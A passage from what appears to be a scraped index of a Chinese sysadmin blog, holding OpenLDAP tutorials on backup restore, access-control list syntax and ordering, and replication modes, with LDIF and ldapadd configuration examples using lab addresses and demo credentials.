/etc/openldap/slapd.d 下列命令是恢复数据的命令。其实就是重新添加回去\n$ slapadd -n 1 -F /config/directory/slapd.d -l /backups/data.ldif -w ","permalink":"https://www.oomkill.com/2019/09/ch8-backup-and-restore/","summary":"","title":"理解ldap配置 - OpenLDAP备份与恢复策略"},{"content":"Overview 访问控制 (Access Control) 是对目录树中的IDT访问的权限控制。主要指 “谁” 应该能够 “访问记录” 在 “什么条件下” 他们应该能看到多少这样的记录，这些将是本节中阐述的问题 。\nOpenLDAP控制目录数据访问的主要方法是 通过访问控制列表 (Access Control List)。使 slapd 服务端在处理来自客户端的请求时，会评估客户端是否具有访问所请求的 DIT 的权限。要执行此计算，slapd 将依次计算LDIF 中配置的每个ACL策略，以检查客户端是否有权限访问该 DIT。\nNote：\nACL策略由上而下依次进行匹配 默认的访问控制策略是对所有客户端都允许读取，不管定义了什么ACL策略，rootdn （databases部分设置的）总是允许对所有和任何东西拥有完全的权限（即身份验证、搜索、比较、读和写 ） ACL介绍 访问控制主要定义三大方面：\nwhat 定义对那些地方的访问，部分选择应用访问的条目和/或属性 who 定义人员，部分指定授予哪些实体访问 access 定义权限，部分指定授予的访问。 access to [what] by [who] [control] by [who] [control] access to [resources] by [who] [type of access granted] [control] by [who] [type of access granted] [control] 对于完整的ACL语法，如下面所示 [1]\n\u0026lt;access directive\u0026gt; ::= access to \u0026lt;what\u0026gt; [by \u0026lt;who\u0026gt; [\u0026lt;access\u0026gt;] [\u0026lt;control\u0026gt;] ]+ \u0026lt;what\u0026gt; ::= * | [dn[.\u0026lt;basic-style\u0026gt;]=\u0026lt;regex\u0026gt; | dn.\u0026lt;scope-style\u0026gt;=\u0026lt;DN\u0026gt;] [filter=\u0026lt;ldapfilter\u0026gt;] [attrs=\u0026lt;attrlist\u0026gt;] \u0026lt;basic-style\u0026gt; ::= regex | exact \u0026lt;scope-style\u0026gt; ::= base | one | subtree | children \u0026lt;attrlist\u0026gt; ::= \u0026lt;attr\u0026gt; [val[.\u0026lt;basic-style\u0026gt;]=\u0026lt;regex\u0026gt;] | \u0026lt;attr\u0026gt; , \u0026lt;attrlist\u0026gt; \u0026lt;attr\u0026gt; ::= \u0026lt;attrname\u0026gt; | entry | children \u0026lt;who\u0026gt; ::= * | [anonymous | users | self | dn[.\u0026lt;basic-style\u0026gt;]=\u0026lt;regex\u0026gt; | dn.\u0026lt;scope-style\u0026gt;=\u0026lt;DN\u0026gt;] [dnattr=\u0026lt;attrname\u0026gt;] [group[/\u0026lt;objectclass\u0026gt;[/\u0026lt;attrname\u0026gt;][.\u0026lt;basic-style\u0026gt;]]=\u0026lt;regex\u0026gt;] [peername[.\u0026lt;basic-style\u0026gt;]=\u0026lt;regex\u0026gt;] [sockname[.\u0026lt;basic-style\u0026gt;]=\u0026lt;regex\u0026gt;] [domain[.\u0026lt;basic-style\u0026gt;]=\u0026lt;regex\u0026gt;] [sockurl[.\u0026lt;basic-style\u0026gt;]=\u0026lt;regex\u0026gt;] [set=\u0026lt;setspec\u0026gt;] [aci=\u0026lt;attrname\u0026gt;] \u0026lt;access\u0026gt; ::= [self]{\u0026lt;level\u0026gt;|\u0026lt;priv\u0026gt;} \u0026lt;level\u0026gt; ::= none | disclose | auth | compare | search | read | write | manage \u0026lt;priv\u0026gt; ::= {=|+|-}{m|w|r|s|c|x|d|0}+ \u0026lt;control\u0026gt; ::= [stop | continue | break] what 部分将确定如何控制客户端访问的条目，通常为三种方式： 通过DN 通过过滤器 (filter) 通过属性 (attributes) who 部分将确定被授予访问权限的用户实体 \u0026lt;who\u0026gt; ， \u0026lt;access\u0026gt; ， \u0026lt;control\u0026gt; access 部分确定了实体的访问权限 控制访问内容 访问内容也是 ACL 中 what 部分，例如下属为简单表示的语法格式\nto * to dn[.\u0026lt;basic-style\u0026gt;]=\u0026lt;regex\u0026gt; to dn.\u0026lt;scope-style\u0026gt;=\u0026lt;DN\u0026gt; 其中 to * 表示选择所有条目 to dn[.\u0026lt;basic-style\u0026gt;]=\u0026lt;regex\u0026gt; ：通过正则表达式与DIT规范的DN来选择内容 to dn.\u0026lt;scope-style\u0026gt;=\u0026lt;DN\u0026gt; ：内容将被限制在DN范围内 其中范围包含下述几项：\nbase：仅匹配提供DN的条目 one：父条目是指定DN的条目 subtree：匹配指定DN下的所有子树中的条目，包含RootDN children：匹配指定的DN下的所有子条目，不包含RootDN 例如下列实例\n0: o=suffix 1: cn=Manager,o=suffix 2: ou=people,o=suffix 3: uid=kdz,ou=people,o=suffix 4: cn=addresses,uid=kdz,ou=people, o=suffix 5：uid=hyc,ou=people,o=suffix 如果请求为 dn.base=\u0026quot;ou=people,o=suffix\u0026quot; 将匹配2 如果请求为 dn.one=\u0026quot;ou=people,o=suffix\u0026quot; 将匹配 3, 5 如果请求为 dn.subtree=\u0026quot;ou=people,o=suffix\u0026quot; 将匹配 2, 3, 4, 5 如果请求为 dn.children=\u0026quot;ou=people,o=suffix\u0026quot; 将匹配 3, 4, 5 Notes：在配置ACL时，to * 通常放置在ACL策略中最下层，即代表不匹配所有的权限时给的权限\n通过DN匹配示例 access to dn.regex=\u0026quot;uid[^,]+,ou=Users,dc=example,dc=com\u0026quot; 这表示 所有 来自任意 uid 为逗号开头的 ou=Users,dc=example,dc=com 域的权限\n使用filter匹配 to filter=\u0026lt;ldap filter\u0026gt; 例 ：DN与filter可以同时包含在 \u0026lt;what\u0026gt; 子句中\naccess to filter=(objectClass=person) access to filter=\u0026quot;(|(|(givenName=Matt)(givenName=Barbara))(sn=Kant))\u0026quot; access to dn.subtree=\u0026quot;ou=Users,dc=example,dc=com\u0026quot; filter=\u0026quot;(employeeNumber=*)\u0026quot; 例 ： \u0026lt;what\u0026gt; 子句中也可以包含属性来进行过滤，多个属性可以通过符号 “,” 分割\nattrs=\u0026lt;attribute list\u0026gt; access to attrs=userPassword,shadowLastChange 例：通过使用单个 attribute 与使用value选择器来过滤出特定的属性\nattrs=\u0026lt;attribute\u0026gt; val[.\u0026lt;style\u0026gt;]=\u0026lt;regex\u0026gt; access to dn.children=\u0026quot;cn=people,dc=stanford,dc=edu\u0026quot; attrs=suPrivilegeGroup val.regex=\u0026quot;^stanford:.+\u0026quot; Notes： “ * ” 代表 dn=*\nWHO \u0026lt;who\u0026gt; 部分标识被授权访问的角色，例如被授权访问的用户\nNotes：who 代表的是一个实体，例如用户，组，域，二不是访问的条目\n下表总结了who拥有的角色\n标识符 访问实体 * 所有，包括匿名和经过身份验证的用户 anonymous 匿名用户（未验证） users 通过身份验证的用户 self 与目标条目关联的用户 dn[.\u0026lt;basic style\u0026gt;]=\u0026lt;regex\u0026gt; 匹配正则表达式的用户 dn.\u0026lt;scope-style\u0026gt;=\u0026lt;DN\u0026gt; DN范围内的用户 例：who子句中的 dnattr 仅适用于符合ldap语法的DN的属性，而不是其他属性\ndnattr=\u0026lt;dn-valued attribute name\u0026gt; by *dnattr*=orgaAdmin ACCESS access 类型可以是下列之一：\n级别 权限 描述 none 0 禁止访问 disclose d 检测信息是否存在 auth dx 需要验证 compare cdx 需要比较 search scdx 需要应用搜索过滤器 read rscdx 需要读搜索结果 write wrscdx 需要修改/重命名 manage mwrscdx 需要管理 其中权限字段字母意思为：\nw：对记录或属性的写访问。 r：对记录或属性的读访问。 s：对记录或属性的搜索访问。 c：访问对记录或属性运行比较操作。 x：访问对记录或属性执行服务器端身份验证操作。 d：访问记录或属性是否存在的信息 (d 代表“disclose” )。 0：不允许访问记录或属性。这相当于 wrscxd 。 m：管理权限 例 ：最简单的access策略，限制所有人都可以读\naccess to * by * read 例 ：下面示例为，对于条目所属者可以修改自己，匿名用户需要登陆，所有人可以读，对于 by anonymous auth 仅仅是声明了匿名用户可以登录，而读的属性是下面那条声明的。\naccess to * by self write by anonymous auth by * read 例 ：使用 SSF Security Strength Factor 进行认证，SSF表示为openldap中保护的强度，与密钥长度有关\n下列带包了，如果ssf强度大于128的将允许被修改自己，大于64的匿名用户可以读操作\naccess to * by ssf=128 self write by ssf=64 anonymous auth by ssf=64 users read 例 ：下面示例为 DN示例，这将代表了人员必须有所有用户搜索 dc=example,dc=com 子目录，并且对 dn.children=\u0026quot;dc=com 的子目录有读权限，而这里 dc=example,dc=com 为 dc=com 子目录，所以说如果要读 目录 dc=example,dc=com 此时没有权限，因为ACL策略是按照顺序进行的，匹配到后就结束了\naccess to dn.children=\u0026quot;dc=example,dc=com\u0026quot; by * search access to dn.children=\u0026quot;dc=com\u0026quot; by * read 例 ：还需要注意的一点是，所有列出的策略结尾都会隐式增加一条 access to * by * none 即，当没有通过who子句，也会被拒绝。\n例如该策略将允许 dc=example,dc=com 子目录，并且属性 homePhone 的属于自己条目的可以写入，可以进行搜索，并包含 dn=dc=example,dc=com 下的所有子条目，并且网络客户端为10开头的ip都可以读，其他的将被隐式策略拒绝\naccess to dn.subtree=\u0026quot;dc=example,dc=com\u0026quot; attrs=homePhone by self write by dn.children=\u0026quot;dc=example,dc=com\u0026quot; search by peername.regex=IP=10\\..+ read access to dn.subtree=\u0026quot;dc=example,dc=com\u0026quot; by self write by dn.children=\u0026quot;dc=example,dc=com\u0026quot; search by anonymous auth 例 ：有些场景下需要只有组内成员才能删除自己租的条目对象，这个时候就需要用到 dnattr 作为 who 子句的选择器；下面的策略表示只有符合这个域中的成员才能删除自己的DN，这里attrs是必须的\naccess to attrs=member,entry by dnattr=member selfwrite ACL的排序 ACL的顺序也非常重要，如果不配置，将按照默认的固定顺序进行，但是也可以控制顺序的先后，通过为每个值添加 {x} x 为数字，这样可以做到ACL的排序\n例如下列策略，在执行时是由 slapd 服务自动维护的\nolcAccess: to attrs=member,entry by dnattr=member selfwrite olcAccess: to dn.children=\u0026quot;dc=example,dc=com\u0026quot; by * search olcAccess: to dn.children=\u0026quot;dc=com\u0026quot; by * read # 在没指定顺序时，将按照下列顺序执行 olcAccess: {0}to attrs=member,entry by dnattr=member selfwrite olcAccess: {1}to dn.children=\u0026quot;dc=example,dc=com\u0026quot; by * search olcAccess: {2}to dn.children=\u0026quot;dc=com\u0026quot; by * read 比如说在生成好的策略进行动态修改时，例如下列所示，此时时修改顺序将是乱的\nchangetype: modify delete: olcAccess olcAccess: to dn.children=\u0026quot;dc=example,dc=com\u0026quot; by * search - add: olcAccess olcAccess: to dn.children=\u0026quot;dc=example,dc=com\u0026quot; by * write 为了确保可以修改到指定的条目，需要指定对应条目的index，如果并不确定index是多少，可以通过 /etc/openldap/slapd.d/ 对应的文件查看\nchangetype: modify delete: olcAccess olcAccess: {1} - add: olcAccess olcAccess: {1}to dn.children=\u0026quot;dc=example,dc=com\u0026quot; by * write 访问控制示例 关闭匿名访问 创建一个目录管理员组，属于该组的人员都具有管理目录的权限 创建一个配置管理员组，属于该组的人员都具有配置 openldap 的权限 创建一个复制权限用户 ，该账号用于高可用之间的复制 创建一个搜索用户，用于 linux 集中账号认证时的，搜索 提示：\n目录管理员组：操作目录树的管理员都属于目录管理员组。 配置管理员组：可以操作服务器配置的（slapd.ldif）属于配置管理员组 关闭匿名访问 首先slapd默认是允许匿名用户登录的，现在关闭匿名用户登录 在全局部分配置如下（通常全局在配置文件前几行）\nolcDisallows: bind_anon 初始化一些组与用户 创建RootDN与一些组，这里创建了三个组 ：目录管理员组 dirGroup，配置管理员组 confGroup ，与高级管理员组 adminGroup 。\n注：\n这些是在初始化安装好 openldap 环境进行的，而不是存在数据的环境 这里创建的组使用的 groupOfUniqueNames cat \u0026lt;\u0026lt; EOF | ldapadd -x -H ldap://10.0.0.10 -D \u0026quot;cn=admin,dc=test,dc=com\u0026quot; -w 111 dn: ou=tvb,dc=test,dc=com objectClass: organizationalUnit ou: tvb dn: cn=adminGroup,ou=tvb,dc=test,dc=com objectClass: groupOfUniqueNames cn: adminGroup uniqueMember: uid=admin,ou=tvb,dc=test,dc=com dn: cn=dirGroup,ou=tvb,dc=test,dc=com objectClass: groupOfUniqueNames cn: dirGroup uniqueMember: uid=searchUser,ou=tvb,dc=test,dc=com dn: cn=confGroup,ou=tvb,dc=test,dc=com objectClass: groupOfUniqueNames cn: confGroup uniqueMember: uid=syncUser,ou=tvb,dc=test,dc=com EOF 初始化目录管理员用户 syncUser ，配置管理员用户 searchUser ，高级管理员用户 admin ，密码均为111\ncat \u0026lt;\u0026lt; EOF | ldapadd -x -H ldap://10.0.0.10 -D \u0026quot;cn=admin,dc=test,dc=com\u0026quot; -w 111 dn: uid=syncUser,ou=tvb,dc=test,dc=com objectClass: inetOrgPerson objectClass: organizationalPerson objectClass: person objectClass: posixAccount uid: syncUser cn: syncUser uidNumber: 10006 gidNumber: 10002 userPassword: {SSHA}QnB7dO98+hoCUgiaAYaiJWnDzlhn2Tn6 homeDirectory: /home/syncUser loginShell: /bin/bash sn: syncUser givenName: syncUser memberOf: cn=confGroup,ou=tvb,dc=test,dc=com dn: uid=searchUser,ou=tvb,dc=test,dc=com objectClass: inetOrgPerson objectClass: organizationalPerson objectClass: person objectClass: posixAccount uid: searchUser cn: searchUser uidNumber: 10005 gidNumber: 10001 homeDirectory: /home/searchUser loginShell: /bin/bash userPassword: {SSHA}QnB7dO98+hoCUgiaAYaiJWnDzlhn2Tn6 sn: searchUser givenName: searchUser memberOf: cn=dirGroup,ou=tvb,dc=test,dc=com #cat \u0026lt;\u0026lt; EOF | ldapadd -x -H ldap://10.0.0.10 -D \u0026quot;cn=admin,dc=test,dc=com\u0026quot; -w 111 dn: uid=admin,ou=tvb,dc=test,dc=com objectClass: inetOrgPerson objectClass: organizationalPerson objectClass: person objectClass: posixAccount uid: admin cn: admin uidNumber: 0 gidNumber: 0 homeDirectory: /home/admin loginShell: /bin/bash userPassword: {SSHA}QnB7dO98+hoCUgiaAYaiJWnDzlhn2Tn6 sn: admin givenName: admin memberOf: cn=adminGroup,ou=tvb,dc=test,dc=com dn: uid=admin1,ou=tvb,dc=test,dc=com objectClass: inetOrgPerson objectClass: organizationalPerson objectClass: person objectClass: posixAccount uid: admin1 cn: admin uidNumber: 0 gidNumber: 0 homeDirectory: /home/admin loginShell: /bin/bash userPassword: {SSHA}QnB7dO98+hoCUgiaAYaiJWnDzlhn2Tn6 sn: admin givenName: admin memberOf: cn=adminGroup,ou=tvb,dc=test,dc=com EOF 创建权限：管理员用户组有所有权限 这句意思是筛选出dn下的所有不包含uniqueMember的用户，即找到dn=cn=adminGroup,ou=tvb,dc=test,dc=com 在上面我们把起规划为一个组，然后检查他的属性 uniqueMember ，* 表示递归，这里不用填，所有的 uniqueMember 均为最底层 [2]\nby set=\u0026quot;[cn=adminGroup,ou=tvb,dc=test,dc=com]/uniqueMember* \u0026amp; user\u0026quot; manage 创建权限：普通用户仅允许修改自己的密码 这里使用属性选择器进行属性筛选\nolcAccess: to attrs=\u0026quot;userPassword\u0026quot; by set=\u0026quot;[cn=adminGroup,ou=tvb,dc=test,dc=com]/uniqueMember \u0026amp; user\u0026quot; manage # 自己可以修改 by self write # 登录时候需要读，必须设置该选项 by * read 配置数据库的权限 对于客户端请求过来的权限，一般通过Frontend settings段来配置，这也可以理解是全局的ACL，对于后面的ACL会覆盖全局的ACL\n# # Configuration database # dn: olcDatabase=config,cn=config objectClass: olcDatabaseConfig olcDatabase: config olcAccess: to * by set=\u0026quot;[cn=adminGroup,ou=tvb,dc=test,dc=com]/uniqueMember \u0026amp; user\u0026quot; manage by * none 完整的ACL配置部分\nNotes：slapd会根据配置的ACL顺序进行检测，匹配到后就不在继续了，所以在配置时，what 部分（选择器范围）要从小到大，这样可以控制范围就正确，正如上面例子，用户只能修改自己密码，属性选择器一旦写在DN选择器下面，将用远不被执行\nolcAccess: to attrs=\u0026quot;userPassword\u0026quot; by set=\u0026quot;[cn=adminGroup,ou=tvb,dc=test,dc=com]/uniqueMember \u0026amp; user\u0026quot; manage by self write by * read olcAccess: to dn.subtree=\u0026quot;dc=test,dc=com\u0026quot; by set=\u0026quot;[cn=adminGroup,ou=tvb,dc=test,dc=com]/uniqueMember \u0026amp; user\u0026quot; manage by dn.children=\u0026quot;dc=test,dc=com\u0026quot; read by anonymous auth by * read Troubleshooting 默认情况下，获取schema是没有权限的，此时需要添加权限使其可以读取schema权限。\n注：在创建用户和组是需要查看schema权限\nslapd.ldif 文件中添加：\ndn: olcDatabase=frontend,cn=config ... olcAccess: to dn.subtree=\u0026quot;\u0026quot; by * read or olcAccess: to dn.subtree=\u0026quot;dn: cn=schema,cn=config\u0026quot; by * read 填写配置后重新生成配置文件报类似如下错误\n$ slapadd -n0 -F /etc/openldap/slapd.d -l kerberos.ldif SYNTAX 1.3.6.1.4.1.1466.115.121.1.26)): empty AttributeDescription slapadd: could not parse entry (line=1) _# 6.36% eta none elapsed none spd 18.6 M/s Closing DB... 问题原因：如上配置权限换行方式不可，官网给出的解决方法 [1]\nInsufficient access (50)\n问题原因：没有权限\nReference [1] msg00054\n[2] Groups of Groups\n[3] ACLs\n[4] Controls or what to do after a match\n[5] LDAP Access Control\n","permalink":"https://www.oomkill.com/2019/09/ch7-acl/","summary":"","title":"理解ldap配置 - OpenLDAP访问控制（ACL）"},{"content":"LDAP复制概述 openldap的复制 ( replication) 是可以将 LDAP DIT (Directory Information Tree) 同步更新复制到一个或多个LDAP (“ slapd ”) 系统，主要是用于实现备份或提升性能场景。在 openldap中，需要注意的一点是 “复制” 级别属于DIT级别而非LDAP服务级别运行。因此，在运行的一个服务 (slapd) 中的多个DIT，每一个DIT都可以被复制到不同的其他服务中 (slapd) 。本章节只讲述 openldap 2.4+ 的四种复制模式。\n注意：在 openldap 2.4- 提供的复制功能，属于一个额外的守护进程 slurpd。仅适用于（2.3之前版本）。\nopenldap的复制模式 在openldap 2.4+ 中，提供了四种复制模式：\nDelta-syncrepl ：2.3+ N-Way Multi-Provider：2.4+ MirrorMode：2.4+ Syncrepl Proxy Mode slurpd：2.3-，这种模式将不再本章节中阐述 下面将由简到易来阐述四种复制模式\nDelta-syncrepl Delta-syncrepl 模式是基于日志模式 syncrepl 的一种变种模式，主要是为了解决openldap同步机制中的一些缺点。由于传统的同步机制是基于对象的同步机制，即当对象上的任何一个属性发生改变，每一个 comsumer 都会触发获取一次完整的对象（例如对象存在100个属性），这种模式存在以下特点：\n优点：对象发生改变时无需注意改变次数，仅需要结果即可，类似于kubernetes list-watch 机制 缺点：开支过大，例如存在102,400个对象，每个对象大小1KB，当跑脚本批量更改所有对象的其中一个属性时（2Byte），每个comsumer将要触发的同步数据将为100MB数据，来更改200KB数据，外加TCP/IP协议的开销 Delta-syncrepl 的诞生就是为了解决 syncrepl 机制的缺点\nNote:\nsyncrepl 就是传统的 povider-comsumer/master-slave 模型 Delta-syncrepl 需要注意的一点就是，当两边数据完全不同（或为空）将使用 syncrepl 同步完成后切换为 Delta-syncrepl 模式 对于 Delta-syncrepl 与 syncrepl 模式来说可以产生多种变种模型，push 与 pull\n主从拉取模式 master-slave 拉取模式将按照下图所示的步骤进行同步\n图：master-slave拉取模式 Source：https://www.zytrax.com/books/ldap/ch7/\n如图所示\n(1) 与 (3) 为 slapd服务的 master 与 slave 角色 （编号与角色按顺序对应）\n(4) 是master上的对象条目， (5) 为slave要拉去的数据\n(2) 为同步的过程\n(6) 与 (7) 分别为 master 与 slave 上需要配置的配置选项\n(A-E) 为同步的步骤\n在图中可以看出，同步时提供者master会分配一个cookie (SyncCookie) 给消费者slave，本质上来说，cookie中包含了更改序列号，指发送给这个消费者的最后一个修改（时间戳），通过对比检查点，即同步会话发生开启时，将slave最后收到的cookie发送给master，以获得同步的限制，第一次时将会全量同步所有记录。\n主从推送模式 图：master-slave推送模式 Source：https://www.zytrax.com/books/ldap/ch7/\n如图所示\n(1) 与 (3) 为 slapd服务的 master 与 slave 角色 （编号与角色按顺序对应）\n(4) 是master上的对象条目， (5) 为slave要拉去的数据\n(2) 为同步的过程\n(6) 与 (7) 分别为 master 与 slave 上需要配置的配置选项\n(A-E) 为同步的步骤\n在该模式下，slave可以为多个，提供者master没有维护slave的信息，即任意slave都可以申请同步，只需要满足安全限制即可，同步请求本质时一个搜索，因为配置中会定义 DN，范围，过滤条件等信息。\n并且在这种模式下，cookie的维护有提供者master维护，master定期发送一个同步cookie。同步的机制类似于拉去模式，并且该模式下只要申请了同步，那么这个链接会永久被维护，也就是图中 persist 代表的意义，除非master, slave网络发生故障。\n主从配置的缺点：\n多节点访问：如果所有或大多数客户端都需要更新DIT，则所有客户端必须访问同一个服务 (slave) 进行正常读访问，而另一个服务（master）进行更新。或者，客户端始终访问主服务。后一种情况下，slave仅提供备份功能 弹性。由于只存在一个服务为更新的节点，这意味着存在单点故障问题 主从模式的配置 两种模式配置起来非常相似，只是所遇到场景的不同而需要不同的应用方法\n关停服务进行配置 在安装openldap部分，ldif文件中有配置database部分，这将代表了生成的配置文件，例如下面database部分的配置\n# # Backend database definitions # # 这里是数据库的参数配置 dn: olcDatabase=mdb,cn=config objectClass: olcDatabaseConfig # 使用的数据库引擎是mdb objectClass: olcMdbConfig olcDatabase: mdb # Suffix 为数据库的后缀，每个数据库至少一个，在搜索时-D 后面的域后缀为dc=test,dc=com将被pass到这里 olcSuffix: dc=test,dc=com # 指不收前面配置的权限控制的管理员账户，拥有最最高权限 olcRootDN: cn=admin,dc=test,dc=com # 特权账户的登录密码 olcRootPW: {SSHA}xU9xFym/s7rawpmzpsYE+Q1qPsVPOwDw olcDbDirectory:\t/var/lib/ldap # 这是索引属性，下面是默认的属性 # 下列注释行意思为 # olcDbIndex: default pres,eq # olcDbIndex: uid # olcDbIndex: cn,sn pres,eq,sub # olcDbIndex: objectClass eq # pres,eq 为 present equality # 第二行意思为，为uid属性类型维护默认索引集 # 第三行意思为，为cn,sn属性维护pres,eq,sub索引集 # 索引集类型有 pres,eq,approx,sub,none olcDbIndex: objectClass eq,pres olcDbIndex: uid,ou,cn,mail,surname,givenname eq,pres,sub # 配置从缓冲区写入磁盘的，两个参数分别为多少kbyte大小的数据自上次（第二个参数）分钟则发生一次写入 olcDbCheckpoint: 1024 10 而在openldap中所有的同步模式的机制都是上面所示的database的子集，即需要拥有上述的配置，例如下列配置\nNotes：openldap中数据库可以有多个，因为openldap是基于对象而不是基于服务\n# # Backend database definitions # dn: olcDatabase={1}mdb,cn=config objectClass: olcDatabaseConfig objectClass: olcMdbConfig olcDatabase: mdb olcSuffix: dc=test,dc=com olcRootDN: cn=admin,dc=test,dc=com olcDbDirectory:\t/var/lib/ldap olcDbIndex: objectClass eq,pres olcDbCheckpoint: 1024 10 olcDbIndex: uid,ou,cn,mail,surname,givenname eq,pres,sub olcRootPW: {SSHA}xU9xFym/s7rawpmzpsYE+Q1qPsVPOwDw # 为dn为dn: olcDatabase={1}mdb,cn=config的数据库配置同步 dn: olcOverlay=syncprov,olcDatabase={1}mdb,cn=config objectclass: olcSyncProvConfig objectClass: olcOverlayConfig olcOverlay: syncprov olcSpCheckpoint: 100 10 dn: olcDatabase={2}mdb,cn=config objectClass: olcDatabaseConfig objectClass: olcMdbConfig olcDatabase: mdb olcSuffix: dc=test1,dc=com olcRootDN: cn=admin,dc=test1,dc=com olcDbDirectory: /var/lib/ldap olcDbIndex: objectClass eq,pres olcDbCheckpoint: 1024 10 olcDbIndex: uid,ou,cn,mail,surname,givenname eq,pres,sub olcRootPW: {SSHA}xU9xFym/s7rawpmzpsYE+Q1qPsVPOwDw 配置说明：\nolcOverlay 属性是必须值 olcSyncProvConfig 属性是基于 olcOverlay 后添加的属性 必须开启module syncprov 才可以使用 上面的是master的配置，slave配置如下：\n# # Backend database definitions # dn: olcDatabase=mdb,cn=config objectClass: olcDatabaseConfig objectClass: olcMdbConfig olcDatabase: mdb olcSuffix: dc=test,dc=com olcRootDN: cn=admin,dc=test,dc=com olcRootPW: {SSHA}xU9xFym/s7rawpmzpsYE+Q1qPsVPOwDw olcDbDirectory:\t/var/lib/ldap olcDbIndex: objectClass eq,pres olcDbIndex: uid,ou,cn,mail,surname,givenname eq,pres,sub olcDbCheckpoint: 1024 10 olcSyncRepl: rid=002 provider=ldap://10.0.0.10:389/ bindmethod=simple binddn=\u0026quot;cn=admin,dc=test,dc=com\u0026quot; credentials=111 searchbase=\u0026quot;dc=test,dc=com\u0026quot; scope=sub schemachecking=on type=refreshAndPersist retry=\u0026quot;30 5 300 3\u0026quot; interval=00:00:05:00 当配置完成后，可以看到master上已经收到slave申请的同步请求了\nNov 8 21:28:15 ldap slapd[65362]: conn=1001 fd=11 ACCEPT from IP=10.0.0.3:45860 (IP=0.0.0.0:389) Nov 8 21:28:15 ldap slapd[65362]: conn=1001 op=0 BIND dn=\u0026quot;cn=admin,dc=test,dc=com\u0026quot; method=128 Nov 8 21:28:15 ldap slapd[65362]: conn=1001 op=0 BIND dn=\u0026quot;cn=admin,dc=test,dc=com\u0026quot; mech=SIMPLE ssf=0 Nov 8 21:28:15 ldap slapd[65362]: conn=1001 op=0 RESULT tag=97 err=0 text= Nov 8 21:28:15 ldap slapd[65362]: conn=1001 op=1 SRCH base=\u0026quot;dc=test,dc=com\u0026quot; scope=2 deref=0 filter=\u0026quot;(objectClass=*)\u0026quot; Nov 8 21:28:15 ldap slapd[65362]: conn=1001 op=1 SRCH attr=* + 不停服务进行配置 openldap提供了一个api ldapi:/// 可以在外部进行更改正在运行的服务，下面配置为master不停服务进行配置\n首先找到对应的db配置看是属于哪个块，例如这里为 olcDatabase={2}mdb\nls /etc/openloda/slapd.d/cn\\=config/olcDatabase\\=\\{2\\}mdb.ldif 那么接下来的dn就需要指定这个db\ncat \u0026lt;\u0026lt; EOF | ldapadd -Y EXTERNAL -H ldapi:/// dn: olcOverlay=syncprov,olcDatabase={2}mdb,cn=config objectClass: olcOverlayConfig objectClass: olcSyncProvConfig olcOverlay: syncprov olcSpSessionLog: 100 EOF 同理接下来配置slave，由于slave配置的dn为已经存在的，需要进行修改，同理这里也需要找到对应的 dn olcDatabase={2}mdb,cn=config\nNotes: ldif也可以向yaml那样属于另外一个定义可以使用符号 “ - ” 分割\ncat \u0026lt;\u0026lt; EOF | ldapadd -Y EXTERNAL -H ldapi:/// dn: olcDatabase={2}mdb,cn=config changetype: modify add: olcSyncRepl olcSyncRepl: rid=001 provider=ldap://10.0.0.10:389/ bindmethod=simple binddn=\u0026quot;cn=admin,dc=test,dc=com\u0026quot; credentials=111 searchbase=\u0026quot;dc=test,dc=com\u0026quot; scope=sub schemachecking=on type=refreshAndPersist retry=\u0026quot;30 5 300 3\u0026quot; interval=00:00:05:00 MirrorMode 镜像模式实际上属于master-slave的一个变种，是为master-slave模式提供了两端一致性的保障，就是两端互为porvider与comsumer，即一个HA)解决方案\n图：镜像模式在多数据中心的应用架构图 Source：https://www.openldap.org/doc/admin24/replication.html#MirrorMode\n镜像模式的配置 镜像模式配置与主从模式完全相同，并且工作模式也是相同的，下面仅提供热配置的方式，这种配置完后重启服务也是生效的\n首先提供porvider部分的配置，因为两端是相同的，只需要修改ServerID即可\ncat \u0026lt;\u0026lt; EOF | ldapadd -Y EXTERNAL -H ldapi:/// dn: olcOverlay=syncprov,olcDatabase={2}mdb,cn=config objectClass: olcOverlayConfig objectClass: olcSyncProvConfig olcOverlay: syncprov olcSpSessionLog: 100 - dn: cn=config changetype: modify replace: olcServerID olcServerID: 0 EOF 下面是comsumer部分的配置，因为两端是相同的，注意修改 rid , credentials , provider 值为正确的值， provider 由多个组成\ncat \u0026lt;\u0026lt; EOF | ldapadd -Y EXTERNAL -H ldapi:/// dn: olcDatabase={2}mdb,cn=config changetype: modify add: olcSyncRepl olcSyncRepl: rid=001 provider=ldap://10.0.0.10:389/ bindmethod=simple binddn=\u0026quot;cn=admin,dc=test,dc=com\u0026quot; credentials=111 searchbase=\u0026quot;dc=test,dc=com\u0026quot; scope=sub schemachecking=on type=refreshAndPersist retry=\u0026quot;30 5 300 3\u0026quot; interval=00:00:05:00 - add: olcMirrorMode olcMirrorMode: TRUE EOF N-way Multi-Master 在 openldap 2.4+ 引入了 多路多主 (N-way Multi-Master ) 模式。该模式中任何数量的主机都可以彼此同步。由于 多路多主模式也是属于 Syncrepl 模式的变种，这里不过多阐述同步原理了。\nNotes：该模式中，所有master上的时钟同步是必须的\n下图为 N-way Multi-Master 模式的架构图，在此模式下所有的节点即为master又为slave，所有的节点的slave都为集群数量减一个。\n图：N-way Multi-Master模式 Source：https://www.openldap.org/doc/admin24/replication.html#MirrorMode\n如图所示\n(1) (2) (3) 为 slapd服务，因为使用 syncrepl 复制技术需要为每个服务提供一个唯一的 olcServerID/ServerID 在整个集群中。 (5) (6) (7) 为 (1) (2) (3) 服务 syncprov overlay 的配置 (4) 是为 (1) (2) (3) 提供了 provider syncprov overlay 的配置 此模式中每个节点发生了写入动作后，都会同步至集群中另外的所有节点上 Notes：这种模式下不支持增量同步\nsyncrepl N-Way Multi-Master配置 这种模式与最基础的 syncrepl 是类似的，不在过多阐述\n首先提供porvider部分的配置，注意修改ServerID即可，多个节点之间必须唯一\ncat \u0026lt;\u0026lt; EOF | ldapadd -Y EXTERNAL -H ldapi:/// dn: olcOverlay=syncprov,olcDatabase={2}mdb,cn=config objectClass: olcOverlayConfig objectClass: olcSyncProvConfig olcOverlay: syncprov olcSpSessionLog: 100 EOF cat \u0026lt;\u0026lt; EOF | ldapadd -Y EXTERNAL -H ldapi:/// dn: cn=config changetype: modify replace: olcServerID olcServerID: 0 EOF 下面是comsumer部分的配置，因为两端是相同的，注意修改 rid , credentials , provider 值为正确的值\ncat \u0026lt;\u0026lt; EOF | ldapadd -Y EXTERNAL -H ldapi:/// dn: olcDatabase={2}mdb,cn=config changetype: modify add: olcSyncRepl olcSyncRepl: {0}rid=001 provider=ldap://10.0.0.10:389/ bindmethod=simple binddn=\u0026quot;cn=admin,dc=test,dc=com\u0026quot; credentials=111 